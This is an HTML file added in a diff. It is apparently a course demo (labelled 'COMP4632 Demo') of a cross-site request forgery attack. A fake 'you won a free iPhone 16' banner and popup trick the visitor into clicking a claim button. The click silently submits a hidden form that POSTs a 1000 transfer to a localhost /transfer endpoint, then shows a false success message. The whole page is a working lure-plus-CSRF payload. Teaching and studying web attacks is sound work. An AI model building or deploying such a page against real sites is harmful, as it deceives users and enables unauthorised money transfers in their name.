@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Fake Prize Page with Popup</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    #winnerBanner {
+      background: linear-gradient(135deg, #ffcc00, #ffdd55);
+      color: #000;
+      text-align: center;
+      padding: 15px;
+      font-size: 24px;
+      font-weight: bold;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      z-index: 999;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      animation: pulse 2s infinite;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+    }
+    
+    @keyframes pulse {
+      0% { background: linear-gradient(135deg, #ffcc00, #ffdd55); }
+      50% { background: linear-gradient(135deg, #ffdd55, #ffee88); }
+      100% { background: linear-gradient(135deg, #ffcc00, #ffdd55); }
+    }
+    
+    .iphone-img {
+      height: 40px;
+      width: auto;
+      vertical-align: middle;
+    }
+    
+    #popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: white;
+      border: 3px solid #ffcc00;
+      border-radius: 15px;
+      padding: 30px;
+      z-index: 1000;
+      text-align: center;
+      display: block;
+      max-width: 500px;
+      box-shadow: 0 5px 30px rgba(0,0,0,0.3);
+    }
+    
+    .popup-iphone {
+      width: 150px;
+      height: auto;
+      margin: 0 auto 20px;
+      display: block;
+    }
+    
+    #attackForm {
+      display: none;
+    }
+    
+    #successMessage {
+      display: none;
+      color: green;
+      text-align: center;
+      margin-top: 80px;
+      font-size: 18px;
+    }
+    
+    body {
+      padding-top: 80px;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
+    
+    #claimButton {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 12px 25px;
+      font-size: 18px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 10px;
+      transition: all 0.3s;
+    }
+    
+    #claimButton:hover {
+      background-color: #45a049;
+      transform: scale(1.05);
+    }
+    
+    button {
+      background-color: #f44336;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    
+    button:hover {
+      background-color: #d32f2f;
+    }
+  </style>
+</head>
+<body>
+  <!-- Winner Banner at the top -->
+  <div id="winnerBanner">
+    <img src="iphone.jpg" alt="iPhone 16" class="iphone-img">
+    <span>🎉 CONGRATULATIONS! YOU WON A FREE iPhone 16! 🎉</span>
+    <img src="iphone.jpg" alt="iPhone 16" class="iphone-img">
+  </div>
+
+<h2 style="text-align: center; margin-top: 50px;">COMP4632 Demo</h2>
+
+  <!-- Popup Advertisement -->
+  <div id="popup">
+    <img src="iphone.jpg" alt="iPhone 16" class="popup-iphone">
+    <h2>🎉 YOU'RE OUR 1,000,000TH VISITOR! 🎉</h2>
+    <p>As a special reward, you've been selected to receive:</p>
+    <p style="font-size: 22px; font-weight: bold; color: #ff6600;">FREE iPhone 16 + $500 Gift Card!</p>
+    <p>Click below to claim your prize now!</p>
+    <button id="claimButton">CLAIM YOUR PRIZE NOW!</button>
+    <button onclick="closePopup()">No Thanks</button>
+  </div>
+
+  <!-- Hidden CSRF Attack Form -->
+  <form id="attackForm" action="http://localhost:3000/transfer" method="POST">
+    <input type="hidden" name="amount" value="1000">
+  </form>
+  <p id="successMessage">Success! Your request has been processed.</p>
+
+  <script>
+    function closePopup() {
+      document.getElementById('popup').style.display = 'none';
+    }
+    
+    // When the claim button is clicked, submit the CSRF form
+    $('#claimButton').on('click', function() {
+      $('#attackForm').submit();
+      $('#successMessage').show();
+      closePopup();
+    });
+  </script>
+</body>
+</html>
